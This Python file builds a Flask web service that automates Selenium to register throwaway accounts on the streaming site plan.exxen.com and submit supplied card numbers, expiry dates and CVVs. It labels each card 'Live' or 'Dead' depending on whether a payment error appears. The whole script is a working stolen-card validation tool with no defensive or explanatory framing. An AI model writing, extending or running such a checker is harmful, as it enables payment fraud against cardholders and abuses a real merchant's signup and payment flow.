from flask import Flask, request, jsonify
from selenium import webdriver
from selenium.webdriver.common.by import By
import time
import random
import string

app = Flask(__name__)

def generate_random_email():
    random_string = ''.join(random.choices(string.ascii_lowercase, k=10))
    email = f"{random_string}@gmail.com"
    return email

def perform_selenium_steps(payload):
    driver = webdriver.Chrome()

    try:
        email = generate_random_email()
        driver.get("https://plan.exxen.com/tr/otp/email")
        email_input = driver.find_element(By.ID, "userEmail")
        email_input.send_keys(email)
        driver.find_element(By.ID, "submitBtn").click()

        time.sleep(2)
        driver.find_element(By.ID, "userFullName").send_keys("Codex Allah")
        driver.find_element(By.ID, "userPassword").send_keys("codexallahgibi!")
        driver.find_element(By.CLASS_NAME, "checkbox").click()
        driver.find_element(By.ID, "submitBtn").click()


        driver.find_element(By.CLASS_NAME, "checkbox").click()
        driver.find_element(By.ID, 'cardNumber').send_keys(payload['cardNumber'])
        driver.find_element(By.ID, "expirationDate").send_keys(payload['expireDate'])
        driver.find_element(By.ID, "cvv").send_keys(payload['cvv'])
        driver.find_element(By.ID, "fullName").send_keys("Codex Allah")
        

   
        driver.find_element(By.ID, "submitBtn").click()


        time.sleep(2)  
        page_source = driver.page_source

        if "credit-card-form-error" in page_source:
            return "Dead 💀: {} | {} | {}".format(payload['cardNumber'], payload['expireDate'], payload['cvv'])
        else:
            return "Live ✅: {} | {} | {}".format(payload['cardNumber'], payload['expireDate'], payload['cvv'])

    except Exception as e:
        print("Selenium Hatası:", str(e))  
        return "Selenium Hatası: {}".format(str(e))

    finally:
        driver.quit()

@app.route('/payment', methods=['GET'])
def payment():
    try:
       
        payload = {
            'cardNumber': request.args.get('cardNumber'),
            'expireDate': request.args.get('expireDate'),
            'cvv': request.args.get('cvv')
        }

        
        result = perform_selenium_steps(payload)

        return jsonify({"status": result}), 200

    except Exception as e:
        return jsonify({"error": str(e)}), 500

if __name__ == "__main__":
    app.run(debug=True)
